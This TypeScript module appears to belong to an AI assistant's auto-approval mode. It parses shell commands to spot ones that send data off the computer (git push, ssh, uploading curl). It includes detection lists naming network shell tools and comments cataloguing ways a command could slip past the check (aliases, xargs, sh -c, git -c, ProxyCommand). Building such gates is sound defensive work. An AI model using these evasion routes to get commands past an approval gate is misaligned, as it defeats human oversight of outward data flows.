// DEC-11e (Jay 2026-11-04) — adult auto mode asks ONCE per outward destination, then remembers it.
//
// Under auto (approvalPreset.ts `approvalModeFor`), a shell command that sends data off this computer
// asks before it runs: `git push`, `ssh`/`scp`/`sftp`/`rsync` to a remote host, and `curl`/`wget` that
// upload (-T, -F, --data…, a method other than GET/HEAD) to a host that is not this computer. The host
// remembers each destination it was allowed for, per activity and work folder (outwardMemory.ts), and
// does not ask for it again. This module only READS a command: which parts may go out, and where to.
//
// It is conservative. Whenever the destination of a part that may go out cannot be read, the reading is
// `unknown`: the caller asks every time and remembers nothing. That covers, among others:
//   - a command named or argued at run time (`$CMD`, `$(…)`, globs, an unreadable parse);
//   - `git -c`, `--config-env`, `--exec-path`, `--receive-pack`/`--exec`, `--recurse-submodules=on-demand`,
//     remote helpers (`ext::`), an unknown git subcommand (it may be an alias for push);
//   - `git config`/`git remote` changes, a `cd`/`pushd` it cannot follow (DEC-11f), or `GIT_*`/`SSH*`/proxy/`PATH`/`HOME` variables in
//     the same command (they change where a push goes after this reading);
//   - ssh family options that run a local program or change the host (`-o ProxyCommand`, `-F`, `-J`, `-S`,
//     `rsync -e 'ssh -o …'`);
//   - wrappers this module does not model (`xargs`, `find -exec`, `parallel`, `watch`, …) around an
//     outward command, a shell reading a pipe, and inline code that names an outward command
//     (`python3 -c "…git push…"`).
//
// Downloads are not outward (`git fetch/pull/clone`, a plain `curl`/`wget` GET with a written-out address)
// unless their address is only known at run time. An upload to this computer (`localhost`, `127.x`, `[::1]`)
// stays silent; a push or ssh to this computer still asks (it writes outside the work folder, and a loopback
// port can be a tunnel). Not read at all (documented in REQ-E1a): programs and script files the command runs
// (`sh deploy.sh`, `npm run deploy`, `node a.js`), inline code that does not name an outward command, and
// vendor CLIs other than the ones above.
//
// Pure and vscode-free; the host resolves git remote names (resolveOutwardDestinations, with an injected
// git runner) so the smoke test can vary them.
//
// DEC-11f (Jay 2026-11-05) — remembered per repository: for each push the host resolves the repository it really
// runs in (the shell's folder from the SDK hook, then static `cd` steps of an `&&` chain, `-C`, `--git-dir`,
// `--work-tree`, `GIT_DIR=`/`GIT_WORK_TREE=` prefixes) and remembers (repository, destination) pairs. A push whose
// folder or repository cannot be resolved (`cd "$X" && git push`, `cd a; git push`, a `cd` after another command,
// a branch switch before a bare push) asks every time and is never remembered.
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { parseShell, type ShellWord, type SimpleCommand } from "./shellWords.ts";

/** A part of the command that may send data off this computer. */
export type OutwardTarget =
  /**
   * `git push`: `remote` null = the branch's default push remote; `dir` = the folder the static `cd` steps of an `&&`
   * chain lead to, relative to the shell's folder or absolute (the shell's `cd` is logical); `cDirs` = the `-C` steps
   * in order (git changes folder physically: a link followed by `..` is resolved on disk); `gitDir`/`workTree` = a static
   * `--git-dir`/`--work-tree` or `GIT_DIR=`/`GIT_WORK_TREE=` prefix, as written; `bareCd` = a `cd` step names a bare
   * folder name (`cd site`), which a `CDPATH` could send elsewhere.
   */
  | { kind: "git"; remote: string | null; dir: string | null; cDirs?: string[]; gitDir?: string; workTree?: string; bareCd?: true }
  /** Already a destination key (`ssh://host:port`, `https://host`), never with credentials. */
  | { kind: "dest"; destination: string };

export interface OutwardReading {
  /** Some part may send data off this computer: under auto the command does not run silently. */
  outward: boolean;
  /** Why the destination cannot be read (ask every time, remember nothing), or null. */
  unknown: string | null;
  targets: OutwardTarget[];
}

/** Commands that reach the network and that this module reads (or knows it cannot). */
const NETWORK_TOOLS = new Set([
  "git", "ssh", "scp", "sftp", "rsync", "curl", "wget",
  "nc", "ncat", "netcat", "telnet", "socat", "ftp", "lftp", "tftp", "ssh-copy-id", "sshfs", "mosh", "autossh",
  "sendmail", "mail", "mailx", "http", "https", "xh", "xhs", "openssl", "dig", "nslookup", "host", "drill", "whois", "ping", "ping6", "traceroute",
]);
/** Code runners that read a program from standard input or from a file named at run time (`… | python3`, `node <(…)`). */
const INTERPRETERS = new Set(["python", "python2", "python3", "node", "nodejs", "deno", "bun", "perl", "ruby", "php", "lua", "osascript", "tclsh", "expect", "rscript", "jshell", "pwsh", "powershell", "awk", "gawk", "mawk", "nawk"]);
/** Standard input named as a file: a program read from it arrives through the pipe. */
const STDIN_RE = /^(-|\/dev\/stdin|\/dev\/fd\/\d+|\/proc\/self\/fd\/\d+|\/dev\/tty)$/;
/** Any spelling of standard input as a path (`/dev//stdin`, `//dev/./stdin`), after folding `//`, `.` and `..`. */
const isStdinPath = (text: string): boolean => text === "-" || STDIN_RE.test(path.posix.normalize(text.replace(/^\/+/, "/")));
/** Wrappers that build the command line at run time (arguments appended or substituted). */
const ARG_WRAPPERS = new Set(["xargs", "parallel", "find", "watch", "flock", "sem", "entr", "fswatch"]);
/** Lookup tools: silent with a written-out name, unknown with one known only at run time (DNS can carry data). */
const LOOKUPS = new Set(["dig", "nslookup", "host", "drill", "whois", "ping", "ping6", "traceroute"]);
/** Network tools whose destination this module does not read: always `unknown`. */
const UNREAD_NETWORK = new Set(["nc", "ncat", "netcat", "telnet", "socat", "ftp", "lftp", "tftp", "ssh-copy-id", "sshfs", "mosh", "autossh", "sendmail", "mail", "mailx", "http", "https", "xh", "xhs"]);
const SHELLS = new Set(["sh", "bash", "zsh", "dash", "ksh", "mksh", "fish", "csh", "tcsh"]);
/** Prefixes that run the rest of the words as the command, unchanged. */
const TRANSPARENT = new Set(["command", "builtin", "exec", "nohup", "time", "nice", "noglob", "nocorrect", "-", "sudo", "doas", "caffeinate", "timeout", "gtimeout", "stdbuf", "unbuffer", "chronic", "ionice", "arch"]);
/** Shell words that open a group or a clause; the command starts after them. */
const KEYWORDS = new Set(["{", "}", "(", ")", "!", "if", "then", "else", "elif", "fi", "do", "done", "while", "until", "coproc", "function"]);
/** Commands that only print or search the words they are given: a word naming a network tool there is text. */
const TEXT_ONLY = new Set([
  "echo", "printf", "grep", "egrep", "fgrep", "rg", "ag", "ack", "man", "which", "type", "whence", "whatis", "apropos",
  "whereis", "help", "tldr", "info", "cat", "less", "more", "head", "tail", "wc", "tee", "sort", "uniq", "cut", "tr",
]);
const EXPORTERS = new Set(["export", "declare", "typeset", "local", "readonly", "setenv"]);
/** Variables that change where a network command goes, or which program runs as one. */
const NET_ENV = /^(GIT_|SSH|CURL|WGET|RSYNC|HTTPS?_PROXY|ALL_PROXY|NO_PROXY|FTP_PROXY|PATH$|HOME$|XDG_CONFIG_HOME$|ZDOTDIR$|BASH_ENV$|ENV$|LD_|DYLD_|SSL_|NODE_OPTIONS$)/i;
/** Inline code that names an outward command (`python3 -c "…"`, `node -e`, `awk 'BEGIN{system(…)}'`). */
const MENTIONS_OUTWARD = /\bgit\b[\s\S]*?\b(push|send-pack|send-email)\b|(^|[^\w.-])(ssh|scp|sftp|rsync|curl|wget|nc|ncat|netcat|telnet|socat|ftp|lftp|sendmail)(?![\w.-])/i;

/** Git subcommands that never send the repository anywhere (downloads and local work). */
const GIT_LOCAL = new Set([
  "add", "am", "annotate", "apply", "archive", "bisect", "blame", "branch", "bundle", "cat-file", "check-ignore", "check-attr",
  "checkout", "cherry", "cherry-pick", "clean", "clone", "commit", "config", "count-objects", "describe", "diff", "diff-files",
  "diff-index", "diff-tree", "difftool", "fetch", "for-each-ref", "format-patch", "fsck", "gc", "grep", "hash-object", "help",
  "init", "log", "ls-files", "ls-remote", "ls-tree", "maintenance", "merge", "merge-base", "mergetool", "mv", "notes", "prune",
  "pull", "range-diff", "read-tree", "rebase", "reflog", "remote", "repack", "replace", "reset", "restore", "rev-list",
  "rev-parse", "revert", "rm", "shortlog", "show", "show-branch", "show-ref", "sparse-checkout", "stash", "status", "submodule",
  "switch", "symbolic-ref", "tag", "update-index", "update-ref", "verify-commit", "verify-tag", "version", "whatchanged",
  "worktree", "write-tree", "lfs",
]);
/** Git subcommands that reach a remote (with a run-time argument they may carry data out in the address). */
const GIT_NETWORK = new Set(["push", "send-pack", "fetch", "pull", "clone", "ls-remote", "remote", "submodule", "archive", "lfs"]);
/** Git global options that take no value and do not change where a push goes. */
/** git push long options that take no value and name no place or program (exact spelling only). */
const PUSH_PLAIN_LONG = new Set([
  "--all", "--branches", "--mirror", "--tags", "--follow-tags", "--no-follow-tags", "--dry-run", "--porcelain", "--delete",
  "--prune", "--no-prune", "--force", "--force-if-includes", "--no-force-if-includes", "--no-verify", "--verify", "--quiet",
  "--verbose", "--progress", "--no-progress", "--set-upstream", "--atomic", "--no-atomic", "--thin", "--no-thin", "--ipv4",
  "--ipv6", "--no-signed", "--recurse-submodules=check", "--recurse-submodules=no", "--no-recurse-submodules", "--no-force-with-lease",
]);
const GIT_PLAIN_GLOBALS = new Set([
  "--no-pager", "-p", "--paginate", "-P", "--bare", "--no-replace-objects", "--literal-pathspecs", "--glob-pathspecs",
  "--noglob-pathspecs", "--icase-pathspecs", "--no-optional-locks", "--no-advice", "--version", "--help",
]);

/** `--name[=…]` is the long option `name` or an abbreviation of one of `options` (git and getopt accept prefixes). */
const longPrefix = (text: string, options: readonly string[]): boolean => {
  if (!text.startsWith("--") || text.length < 3) return false;
  const name = text.slice(2).replace(/=.*$/, "").replace(/^no-/, "");
  return options.some((o) => o.startsWith(name));
};
const basename = (text: string) => text.replace(/^=/, "").replace(/^.*[\\/]/, "").toLowerCase();

interface State {
  targets: OutwardTarget[];
  unknown: string | null;
  outward: boolean;
  /** `cd`/`pushd`/`popd` ran earlier: later relative places are unknown. */
  moved: boolean;
  /** git config / remotes or a network variable changed earlier in this command. */
  rewired: boolean;
  /** DEC-11f — the whole command is one `&&` chain of plain commands (no `;`, `||`, pipes, groups, substitutions). */
  chain: boolean;
  /** DEC-11f — the folder the static `cd` steps of that chain lead to (relative to the shell's folder), or null. */
  cdPath: string | null;
  /** DEC-11f — a `cd` step named a bare folder name (a `CDPATH` lookup could apply). */
  bareCd: boolean;
  /** DEC-11f — a command other than `cd` or a chain-safe git command ran earlier in the chain. */
  unsafeSeen: boolean;
  /** DEC-11f — an earlier git command may change the current branch (and so the default push remote). */
  headMoved: boolean;
}

const mark = (s: State, why: string) => { s.outward = true; s.unknown ??= why; };
const add = (s: State, t: OutwardTarget) => { s.outward = true; s.targets.push(t); };

/** Read `command` for parts that may send data off this computer. */
export function readOutward(command: string): OutwardReading {
  const s: State = { targets: [], unknown: null, outward: false, moved: false, rewired: false, chain: andChainOnly(command), cdPath: null, bareCd: false, unsafeSeen: false, headMoved: false };
  readScript(command, s, 0);
  // A push read after a change of remotes, config, variables or folder goes somewhere this reading cannot see.
  if (s.outward && (s.rewired || s.moved) && s.targets.length) s.unknown ??= s.rewired ? "remotes or network variables change in the same command" : "the folder changes before it";
  return { outward: s.outward, unknown: s.outward ? s.unknown : null, targets: s.targets };
}

function readScript(script: string, s: State, depth: number): void {
  if (depth > 4) { if (MENTIONS_OUTWARD.test(script)) mark(s, "nested too deep"); return; }
  const parsed = parseShell(script);
  if (parsed.uncertain) {
    // An unreadable command that names no network tool anywhere cannot be read as outward either; one that does asks.
    if (MENTIONS_OUTWARD.test(script) || [...NETWORK_TOOLS].some((t) => new RegExp(`(^|[^\\w.-])${t}(?![\\w.-])`, "i").test(script))) mark(s, `unreadable: ${parsed.uncertain}`);
    return;
  }
  for (const body of parsed.nested) readScript(body, s, depth + 1);
  for (const cmd of parsed.commands) {
    readCommand(cmd, cmd.words, s, depth);
    // DEC-11f — what ran before a push (at any depth: `sh -c '… && git push'`) decides whether it can be placed.
    if (!chainSafe(cmd)) s.unsafeSeen = true;
  }
}

/**
 * DEC-11f — the command is one `&&` chain: outside quotes it has no `;`, `||`, `|`, `&` (other than `&&`), newline,
 * parentheses, braces or substitutions. Only then does a `cd` step say where every later step runs: `cd a && git push`
 * pushes from `a` or not at all, while `cd a; git push`, `(cd a) && git push` or `cd a || true` may push from elsewhere.
 */
function andChainOnly(src: string): boolean {
  const text = src.replace(/\s+$/, "");
  for (let i = 0; i < text.length; i++) {
    const c = text[i];
    if (c === "\\") { if (text[i + 1] === "\n") return false; i++; continue; }
    if (c === "'") { const end = text.indexOf("'", i + 1); if (end < 0) return false; i = end; continue; }
    if (c === '"') {
      let k = i + 1;
      for (; k < text.length && text[k] !== '"'; k++) { if (text[k] === "\\") k++; else if (text[k] === "$" || text[k] === "`") return false; }
      if (k >= text.length) return false;
      i = k; continue;
    }
    if (c === "&") { if (text[i + 1] === "&") { i++; continue; } return false; }
    if (";|\n()`{}$#".includes(c)) return false;
    if ((c === "<" || c === ">") && text[i + 1] === "(") return false;
  }
  return true;
}

/** Git subcommands that may run before a push in the same command: they write no chosen file, move no folder and change neither the branch nor remotes. */
// Not `log`/`show`/`diff` (`--output=` writes any file, e.g. `.git/config`), `stash` (`stash branch` switches),
// `rm`/`mv`/`restore` (they move or rewrite folders a later step relies on).
// Not `pull`: it rewrites checked-out files (a tracked link, an included config file) after the decision (verify r5 C4).
const CHAIN_SAFE_GIT = new Set(["add", "commit", "status", "fetch", "tag", "rev-parse", "ls-files", "push"]);
/** Git subcommands that may change the current branch, so a later bare `git push` may use another default remote. */
const GIT_HEAD_MOVERS = new Set(["checkout", "switch", "rebase", "worktree", "branch", "symbolic-ref", "bisect"]);
/** A redirect that writes no file: a descriptor copy (`2>&1`) or `/dev/null`. */
const harmlessRedirect = (r: { op: string; target: ShellWord }) => !r.target.dynamic && ((/^(>&|<&)$/.test(r.op) && /^\d+$|^-$/.test(r.target.text)) || (/^(>|>>|&>|2>)$/.test(r.op) && r.target.text === "/dev/null"));

/** DEC-11f — a `cd` with one static path, or a git command whose subcommand is chain-safe, with harmless redirects only. */
function chainSafe(cmd: SimpleCommand): boolean {
  if (cmd.heredocs.length || cmd.herestrings.length || cmd.piped || !cmd.redirects.every(harmlessRedirect)) return false;
  const w = cmd.words;
  if (!w.length || w[0].assignment || w[0].dynamic || w[0].glob) return false;
  if (w[0].text === "cd") return w.length === 2 && staticPath(w[1]);
  if (w[0].text !== "git") return false;
  let i = 1;
  while (i < w.length && w[i].text.startsWith("-")) {
    const t = w[i].text;
    if (t === "-C" || t === "--git-dir" || t === "--work-tree") { i += 2; continue; }
    if (/^--(git-dir|work-tree)=/.test(t) || GIT_PLAIN_GLOBALS.has(t)) { i++; continue; }
    return false;
  }
  const sub = w[i];
  return !!sub && !sub.dynamic && !sub.glob && CHAIN_SAFE_GIT.has(sub.text);
}

/** A folder written out in full: no run-time part, no glob, no option, no `~` (the shell expands it from HOME). */
const staticPath = (w: ShellWord | undefined): w is ShellWord =>
  !!w && !w.dynamic && !w.glob && w.text !== "" && !w.text.startsWith("-") && !w.text.startsWith("~") && !/[\u0000-\u001f]/.test(w.text);

function noteAssignments(words: ShellWord[], s: State, all = false): void {
  for (const w of words) {
    if (!(w.assignment || (all && /^[A-Za-z_][A-Za-z0-9_]*\+?=/.test(w.text)))) continue;
    if (NET_ENV.test(w.text.replace(/\+?=[\s\S]*$/, ""))) s.rewired = true;
  }
}

function readCommand(cmd: SimpleCommand, words: ShellWord[], s: State, depth: number): void {
  let i = 0;
  // DEC-11f — `GIT_DIR=x git push` / `GIT_WORK_TREE=y git push` with a written-out value name the repository the push
  // runs in; held back here and passed to git (any other command, or a run-time value, rewires as before).
  const gitEnv: { gitDir?: string; workTree?: string } = {};
  const held: ShellWord[] = [];
  // Leading assignments and grouping words.
  while (i < words.length && (words[i].assignment || KEYWORDS.has(words[i].text) || /^[A-Za-z_][\w-]*\(\)$/.test(words[i].text))) {
    const w = words[i];
    const m = w.assignment ? /^(GIT_DIR|GIT_WORK_TREE)=([\s\S]*)$/.exec(w.text) : null;
    if (m && staticPath({ ...w, text: m[2] })) { held.push(w); if (m[1] === "GIT_DIR") gitEnv.gitDir = m[2]; else gitEnv.workTree = m[2]; }
    else if (w.assignment) noteAssignments([w], s);
    i++;
  }
  // Only `git` itself takes them here (`git-push` from libexec, or any other command, rewires as before).
  const headIsGit = i < words.length && !words[i].dynamic && !words[i].glob && basename(words[i].text) === "git";
  if (!headIsGit) noteAssignments(held, s);
  if (i >= words.length) return;
  const headWord = words[i];
  const rest = words.slice(i + 1);
  if (headWord.dynamic || headWord.glob) {
    // The program is only known at run time.
    mark(s, "the command is named at run time");
    return;
  }
  const head = basename(headWord.text);
  if (EXPORTERS.has(head)) { noteAssignments(rest, s, true); return; }
  if (head === "cd") {
    // DEC-11f — a static `cd` step of an `&&` chain, before anything that could change folders, says where later steps
    // run. Any other `cd` (a run-time folder, `cd -`, `cd ~`, after another command, outside a plain chain) is a move
    // this reading cannot follow.
    const target = rest[0];
    if (depth === 0 && words === cmd.words && s.chain && !s.unsafeSeen && rest.length === 1 && staticPath(target)) {
      s.cdPath = s.cdPath === null || path.posix.isAbsolute(target.text) ? path.posix.normalize(target.text) : path.posix.join(s.cdPath, target.text);
      if (!/^(\/|\.\.?(\/|$))/.test(target.text)) s.bareCd = true;
      return;
    }
    s.moved = true; return;
  }
  if (head === "pushd" || head === "popd") { s.moved = true; return; }
  if (head === "alias") {
    // `alias gp='git push'` defines what a later word runs.
    for (const w of rest) {
      const eq = w.text.indexOf("=");
      if (eq <= 0) continue;
      const value = w.text.slice(eq + 1);
      readScript(value, s, depth + 1);
      // `alias g=git` then `g push`: the alias name hides the command, so any alias of a network tool or runner asks.
      const first = basename(value.trim().split(/\s+/)[0] ?? "");
      if (NETWORK_TOOLS.has(first) || SHELLS.has(first) || INTERPRETERS.has(first) || TRANSPARENT.has(first) || first === "eval" || first === "env" || first === "xargs") mark(s, "an alias names a network command or a runner");
    }
    return;
  }
  if (head === "eval") { readScript(rest.map((w) => w.text).join(" "), s, depth + 1); return; }
  if (head === "env") return readEnv(cmd, rest, s, depth);
  if (TRANSPARENT.has(head)) return readWrapped(cmd, rest, s, depth, true);
  if (SHELLS.has(head)) return readShellRun(cmd, rest, s, depth);
  if (head === "git") return readGit(rest, s, gitEnv);
  // `git-push`, `git-send-pack`, … run straight from git's libexec folder.
  if (head.startsWith("git-")) return readGit([{ ...headWord, text: head.slice(4) }, ...rest], s);
  if (head === "openssl") { if (rest.some((w) => /^(s_client|s_time)$/i.test(w.text) || w.dynamic)) mark(s, "openssl opens a connection"); return; }
  if (LOOKUPS.has(head)) { if (rest.some((w) => w.dynamic || w.glob)) mark(s, `${head} with a name known only at run time`); return; }
  if (INTERPRETERS.has(head)) return readInterpreter(cmd, rest, s);
  if (head === "ssh") return readSsh(rest, s);
  if (head === "scp") return readScp(rest, s);
  if (head === "sftp") return readSftp(rest, s);
  if (head === "rsync") return readRsync(rest, s);
  if (head === "curl") return readCurl(rest, s);
  if (head === "wget") return readWget(rest, s);
  if (UNREAD_NETWORK.has(head)) { mark(s, `${head} is not read`); return; }
  if (TEXT_ONLY.has(head)) return;
  readWrapped(cmd, rest, s, depth, false, head);
}

/** `env [-i] [-u NAME] [-C dir] [-S string] [NAME=value…] command…` */
function readEnv(cmd: SimpleCommand, rest: ShellWord[], s: State, depth: number): void {
  let i = 0;
  while (i < rest.length) {
    const t = rest[i].text;
    if (t === "-S" || t === "--split-string") { readScript(rest.slice(i + 1).map((w) => w.text).join(" "), s, depth + 1); return; }
    if (t.startsWith("-S") || t.startsWith("--split-string=")) { readScript([t.replace(/^-S|^--split-string=/, ""), ...rest.slice(i + 1).map((w) => w.text)].join(" "), s, depth + 1); return; }
    if (t === "-C" || t.startsWith("--chdir")) { s.moved = true; i += t === "-C" || t === "--chdir" ? 2 : 1; continue; }
    if (t === "-u" || t === "--unset") { i += 2; continue; }
    if (t.startsWith("-")) { i++; continue; }
    if (/^[A-Za-z_][A-Za-z0-9_]*=/.test(t)) { noteAssignments([{ ...rest[i], assignment: true }], s); i++; continue; }
    break;
  }
  if (i < rest.length) readCommand(cmd, rest.slice(i), s, depth);
}

/**
 * A prefix around another command. A known transparent one (`nohup`, `sudo`, `time`, …) runs the first
 * network tool among its words exactly; any other command that carries a network tool's name as a word
 * (`xargs git push`, `find . -exec git push \;`) or inline code that names one changes how it runs: unknown.
 */
function readWrapped(cmd: SimpleCommand, rest: ShellWord[], s: State, depth: number, transparent: boolean, head = ""): void {
  for (let j = 0; j < rest.length; j++) {
    const w = rest[j];
    if (w.dynamic && transparent) { mark(s, "a wrapper argument is known only at run time"); return; }
    const name = basename(w.text);
    // A transparent prefix (`nice`, `timeout 9`, `time`) runs its command unchanged: read from the first word that is a
    // command this module treats specially, including an argument-building wrapper (`nice xargs git push`).
    if (transparent && (ARG_WRAPPERS.has(name) || TRANSPARENT.has(name) || name === "alias")) { readCommand(cmd, rest.slice(j), s, depth); return; }
    if (NETWORK_TOOLS.has(name) || SHELLS.has(name) || INTERPRETERS.has(name) || name === "eval" || name === "env" || name.startsWith("git-")) {
      if (transparent) { readCommand(cmd, rest.slice(j), s, depth); return; }
      // xargs/parallel/find -exec hand a shell or interpreter code built at run time (`xargs -I{} sh -c '{}'`).
      if (ARG_WRAPPERS.has(head) && (SHELLS.has(name) || INTERPRETERS.has(name) || name === "eval")) { mark(s, "a wrapper runs a shell or interpreter with arguments built at run time"); return; }
      const inner: State = { ...s, targets: [], unknown: null, outward: false };
      readCommand(cmd, rest.slice(j), inner, depth);
      if (inner.outward) mark(s, "a network command inside a wrapper this app does not read");
      return;
    }
  }
  // Inline code or a heredoc that names an outward command (`python3 -c "…"`, `node <<EOF … EOF`).
  const texts = [...rest.map((w) => w.text), ...cmd.heredocs.map((h) => h.body), ...cmd.herestrings.map((w) => w.text)];
  if (texts.some((t) => MENTIONS_OUTWARD.test(t))) mark(s, "inline code names an outward command");
}

/** `sh -c 'script'`, `bash <<EOF … EOF`, `zsh <<< '…'`, `echo … | sh`. A script file is not read. */
function readShellRun(cmd: SimpleCommand, rest: ShellWord[], s: State, depth: number): void {
  // Options start with `-` or `+` (`bash +x`); `-o`/`+o`/`-O`/`+O` and `--rcfile`/`--init-file` take a value. `-c` may
  // sit anywhere among them (`bash +x -c …`, `bash --rcfile x -c …`).
  let i = 0, inline = false;
  const isOption = (t: string) => (t.startsWith("-") || t.startsWith("+")) && t !== "-" && t !== "--" && t !== "+";
  while (i < rest.length && isOption(rest[i].text)) {
    const t = rest[i].text;
    if (/^-[A-Za-z]*c[A-Za-z]*$/.test(t) || t === "--command") inline = true;
    if (/^[-+][A-Za-z]*[oO]$/.test(t) || t === "--rcfile" || t === "--init-file") i++;
    i++;
  }
  if (i < rest.length && rest[i].text === "--") i++;
  if (inline) {
    const body = rest[i];
    // `xargs -0 sh -c` (the script arrives as an argument at run time).
    if (!body) { mark(s, "a shell runs a script supplied at run time"); return; }
    if (body.dynamic) { if (MENTIONS_OUTWARD.test(body.text) || body.text.includes("$")) mark(s, "a shell runs text known only at run time"); return; }
    readScript(body.text, s, depth + 1);
    return;
  }
  // An option this loop does not know might take the next word: if a later word is a `-c`, read every word as a script.
  if (rest.slice(i).some((w) => /^-[A-Za-z]*c[A-Za-z]*$/.test(w.text) || w.text === "--command")) {
    for (const w of rest.slice(i)) { if (w.dynamic) { mark(s, "a shell runs text known only at run time"); return; } readScript(w.text, s, depth + 1); }
    return;
  }
  // A script file named at run time (`bash <(echo …)`, `sh $F`) or standard input by path (`sh /dev/stdin`) is not read.
  if (rest.slice(i).some((w) => w.dynamic || w.glob)) { mark(s, "a shell runs a script known only at run time"); return; }
  // A shell whose standard input is a pipe or a file and that runs any script other than a written-out `-c` body may
  // read its program from that input (`sh /dev/stdin`, `bash +x /dev/fd/0`, `bash --rcfile x /dev/stdin`): asked.
  if (cmd.piped || cmd.redirects.some((r) => r.op === "<" || r.op === "<>")) { mark(s, "a shell reads from a pipe or file"); return; }
  if (rest.some((w) => isStdinPath(w.text))) { mark(s, "a shell reads its script from standard input"); return; }
  for (const h of cmd.heredocs) readScript(h.body, s, depth + 1);
  for (const h of cmd.herestrings) readScript(h.text, s, depth + 1);
  // Reading its script from a pipe: what arrives is not known here.
  if (i >= rest.length && cmd.piped) mark(s, "a shell reads its script from a pipe");
  if (i >= rest.length && cmd.redirects.some((r) => r.op === "<")) mark(s, "a shell reads its script from a file");
}

/**
 * `python3 -c "…"`, `node -e "…"`, `… | python3`, `node <(…)`. Inline code that names an outward command asks;
 * code from a pipe, a `<` file or a file named at run time is not read and asks. A script file named in full is a
 * known gap (REQ-E1a), like `npm run deploy`.
 */
function readInterpreter(cmd: SimpleCommand, rest: ShellWord[], s: State): void {
  if (rest.some((w) => w.dynamic || w.glob)) { mark(s, "an interpreter runs code known only at run time"); return; }
  const texts = [...rest.map((w) => w.text), ...cmd.heredocs.map((h) => h.body), ...cmd.herestrings.map((w) => w.text)];
  if (texts.some((t) => MENTIONS_OUTWARD.test(t))) { mark(s, "inline code names an outward command"); return; }
  const operands = rest.filter((w) => !w.text.startsWith("-"));
  const inline = rest.some((w) => /^-[A-Za-z]*[ceEr]$|^--(eval|print|command)/.test(w.text));
  const fromStdin = operands.length === 0 || operands.some((w) => isStdinPath(w.text));
  if (!inline && fromStdin && (cmd.piped || cmd.redirects.some((r) => r.op === "<" || r.op === "<>"))) mark(s, "an interpreter reads its program from a pipe or file");
}

// ── git ─────────────────────────────────────────────────────────────────────

function readGit(rest: ShellWord[], s: State, env: { gitDir?: string; workTree?: string } = {}): void {
  let i = 0;
  const cSteps: string[] = [];
  let gitDir = env.gitDir, workTree = env.workTree;
  while (i < rest.length && rest[i].text.startsWith("-")) {
    const w = rest[i], t = w.text;
    if (t === "-C") {
      const v = rest[i + 1];
      if (!staticPath(v)) { s.moved = true; mark(s, "git -C names a folder known only at run time"); return; }
      cSteps.push(v.text);
      i += 2; continue;
    }
    if (GIT_PLAIN_GLOBALS.has(t)) { i++; continue; }
    // DEC-11f — a written-out --git-dir / --work-tree names the repository; a run-time one (or --namespace) is a move.
    const repoOpt = /^--(git-dir|work-tree)(=([\s\S]*))?$/.exec(t);
    if (repoOpt) {
      const v = repoOpt[2] !== undefined ? { ...w, text: repoOpt[3] } : rest[i + 1];
      if (!staticPath(v)) { s.moved = true; i += repoOpt[2] !== undefined ? 1 : 2; continue; }
      if (repoOpt[1] === "git-dir") gitDir = v.text; else workTree = v.text;
      i += repoOpt[2] !== undefined ? 1 : 2; continue;
    }
    if (/^--namespace(=|$)/.test(t)) { s.moved = true; i += t.includes("=") ? 1 : 2; continue; }
    // `-c`, `--config-env`, `--exec-path` and anything unknown can run another program or rewrite the remote.
    mark(s, `git ${t} can change what runs or where it goes`);
    return;
  }
  const subWord = rest[i];
  if (!subWord) return;
  if (subWord.dynamic || subWord.glob) { mark(s, "git subcommand known only at run time"); return; }
  const sub = subWord.text.toLowerCase();
  const args = rest.slice(i + 1);
  // A later bare `git push` uses the default remote of the branch it is on when it runs, not now.
  if (GIT_HEAD_MOVERS.has(sub)) s.headMoved = true;
  if (!GIT_LOCAL.has(sub) && sub !== "push") {
    // An alias (`git p` → push), send-email, svn dcommit, p4 submit, …: not read.
    mark(s, `git ${sub} is not read`);
    return;
  }
  if (GIT_NETWORK.has(sub) && args.some((w) => w.dynamic || w.glob)) { mark(s, `git ${sub} with an argument known only at run time`); return; }
  if (sub === "config") {
    if (!args.some((w) => /^(--get|--get-all|--get-regexp|--list|-l|--show-origin|--show-scope|get|list)$/.test(w.text))) s.rewired = true;
    return;
  }
  if (sub === "remote") { if (args.length && /^(add|set-url|rename|remove|rm|set-head|set-branches)$/.test(args[0].text)) s.rewired = true; return; }
  if (sub === "lfs") { if (args.some((w) => w.text === "push")) mark(s, "git lfs push is not read"); return; }
  if (sub === "submodule") { if (args.some((w) => w.text === "foreach")) mark(s, "git submodule foreach runs commands"); return; }
  if (sub === "rebase") { if (args.some((w) => /^(-x|--exec)(=|$)|^-[A-Za-z]*x/.test(w.text))) mark(s, "git rebase --exec runs commands"); return; }
  if (sub === "bisect") { if (args.some((w) => w.text === "run")) mark(s, "git bisect run runs commands"); return; }
  // Options that run a program named on the command line (`difftool -x`, `grep -O`), long forms by any prefix.
  if (sub === "difftool" || sub === "mergetool") {
    if (args.some((w) => /^-[A-Za-z]*[xtg]/.test(w.text) || longPrefix(w.text, ["extcmd", "tool", "gui", "tool-help"]))) { mark(s, `git ${sub} runs a named tool`); return; }
    return;
  }
  if (sub === "grep") { if (args.some((w) => /^-[A-Za-z]*O/.test(w.text) || longPrefix(w.text, ["open-files-in-pager"]))) mark(s, "git grep -O runs a pager"); return; }
  if (sub === "archive") { if (args.some((w) => /^--(remote|exec)/.test(w.text))) mark(s, "git archive --remote/--exec"); return; }
  if (sub === "fetch" || sub === "pull" || sub === "clone" || sub === "ls-remote") {
    if (args.some((w) => longPrefix(w.text, ["upload-pack", "config", "template", "server-option"]) || /^-[A-Za-z]*[uc]/.test(w.text) && sub === "clone" || /^[A-Za-z][A-Za-z0-9+.-]*::/.test(w.text))) mark(s, `git ${sub} with an option that runs a program`);
    return;
  }
  if (sub !== "push") return;
  // git push [options] [<repository> [<refspec>…]]. Only options known not to name a place or program are read;
  // git accepts any unambiguous prefix of a long option, so anything else asks. A positional repository beats --repo.
  let repoOpt: string | null = null, positional: string | null = null;
  for (let j = 0; j < args.length; j++) {
    const t = args[j].text;
    if (t === "--") { positional ??= args[j + 1]?.text ?? null; break; }
    if (t.startsWith("--")) {
      if (t === "--repo") { repoOpt = args[++j]?.text ?? null; continue; }
      if (t.startsWith("--repo=")) { repoOpt = t.slice(7); continue; }
      if (t === "--push-option") { j++; continue; }
      if (t.startsWith("--push-option=")) continue;
      if (PUSH_PLAIN_LONG.has(t) || /^--force-with-lease(=|$)/.test(t)) continue;
      mark(s, `git push ${t.replace(/=.*$/, "")} is not read`);
      return;
    }
    if (t.startsWith("-") && t.length > 1) {
      // A short bundle of plain flags; `-o` takes the rest of the bundle or the next word.
      for (let k = 1; k < t.length; k++) {
        const c = t[k];
        if (c === "o") { if (k === t.length - 1) j++; break; }
